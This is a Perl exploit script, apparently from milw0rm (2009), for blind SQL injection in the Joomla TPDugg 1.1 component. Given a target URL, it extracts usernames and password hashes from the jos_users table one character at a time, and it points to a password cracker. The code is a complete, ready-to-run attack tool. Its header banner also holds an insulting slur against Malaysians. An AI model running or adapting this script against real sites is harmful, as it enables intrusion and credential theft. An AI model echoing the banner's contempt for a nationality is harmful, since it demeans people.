#!/usr/bin/perl

#//////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\#
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\//////////////////////////////////#
#                                                                    #
# [o] TPDugg Joomla Component 1.1 Blind SQL Injection Exploit        #
#                                                                    #
#      Software : com_tpdugg version 1.1                             #
#      Vendor   : http://www.templateplazza.com/                     #
#      Author   : NoGe                                               #
#      Contact  : noge[dot]code[at]gmail[dot]com                     #
#      Blog     : http://evilc0de.blogspot.com - http://pacenoge.org #
#                                                                    #
# [o] Usage                                                          #
#                                                                    #
#      root@noge:~# perl tpdugg.pl                                   #
#                                                                    #
#                                                                    #
#      [+] URL Path : www.target.com/[path]                          #
#      [+] Valid ID : 1                                              #
#      [+] Column   : username                                       #
#                                                                    #
#      [!] Exploiting http://www.target.com/[path]/ ...              #
#                                                                    #
#      [+] SELECT username FROM jos_users LIMIT 0,1 ...              #
#      [+] jos_users@username> admin                                 #
#                                                                    #
#      [!] Exploit completed.                                        #
#                                                                    #
# [o] Simple Joomla Password Cracker                                 #
#                                                                    #
#      http://pacenoge.org/joomla/                                   #
#                                                                    #
# [o] Greetz                                                         #
#                                                                    #
#      MainHack BrotherHood [ http://mainhack.net ]                  #
#      Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 Angela Zhang aJe           #
#      H312Y yooogy mousekill }^-^{ loqsa zxvf martfella             #
#      skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke                 #
#                                                                    #
#                             --=]> COPY MY STYLE BY SAYKOJI <[=--   #
#                                                                    #
#      FUCK MALAYSIA!!!                                              #
#      DON'T YOU HAVE YOUR OWN CULTURE?                              #
#      AHH I FORGOT.. YOU DON'T HAVE ANY CULTURE. HAHAHAHA...        #
#                                                                    #
#//////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\#
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\//////////////////////////////////#


use HTTP::Request;
use LWP::UserAgent;

# table  : jos_users
# column : username and password

$cmsapp = '[-x-]';
$vuln   = 'index.php?option=com_tpdugg&task=tags&id=';
$table  = 'jos_users';
$regexp = 'There are no items';
$maxlen = 65;

my $OS = "$^O";
if ($OS eq 'MSWin32') { system("cls"); } else { system("clear"); }

printf "\n
                           $cmsapp
 [x]====================================================[x]
  |  Joomla Component com_tpdugg BSQL Injection Exploit  |
  |          [F]ound by NoGe [C]oded by Vrs-hCk          |
  |               www[dot]pacenoge[dot]org               |
 [x]====================================================[x]

\n";

print " [+] URL Path : "; chomp($web=<STDIN>);
print " [+] Valid ID : "; chomp($id=<STDIN>);
print " [+] Column   : "; chomp($columns=<STDIN>);

if ($web =~ /http:\/\// ) { $target = $web."/"; } else { $target = "http://".$web."/"; }

print "\n\n [!] Exploiting $target ...\n\n";
&get_data;
print "\n\n [!] Exploit completed.\n\n";

sub get_data() {
	@columns = split(/,/, $columns);
	foreach $column (@columns) {
		print " [+] SELECT $column FROM $table LIMIT 0,1 ...\n";
		syswrite(STDOUT, " [+] $table\@$column> ", 255);
		for (my $i=1; $i<=$maxlen; $i++) {
			my $chr = 0;
			my $found = 0;
			my $char = 48;
			while (!$chr && $char<=90) {
				if(exploit($i,$char) !~ /$regexp/) {
					$chr = 1;
					$found = 1;
					syswrite(STDOUT,chr($char),1);
				} else { $found = 0; }
				$char++;
			}
			if(!$chr) {
				$char = 97;
				while(!$chr && $char<=122) {
					if(exploit($i,$char) !~ /$regexp/) {
						$chr = 1;
						$found = 1;
						syswrite(STDOUT,chr($char),1);
					} else { $found = 0; }
					$char++;
				}
			}
			if (!$found) {
				print "\n"; last;
			}
		}
	}
}

sub exploit() {
	my $limit = $_[0];
	my $chars = $_[1];
	my $blind = '+AND+ASCII(SUBSTRING((SELECT+'.$column.'+FROM+'.$table.'+LIMIT+0,1),'.$limit.',1))='.$chars;
	my $inject = $target.$vuln.$id.$blind;
	my $content = get_content($inject);
	return $content;
}

sub get_content() {
	my $url = $_[0];
	my $req = HTTP::Request->new(GET => $url);
	my $ua  = LWP::UserAgent->new();
	$ua->timeout(5);
	my $res = $ua->request($req);
	if ($res->is_error){
		print "\n\n [!] Error, ".$res->status_line.".\n\n";
		exit;
	}
	return $res->content;
}

# milw0rm.com [2009-09-09]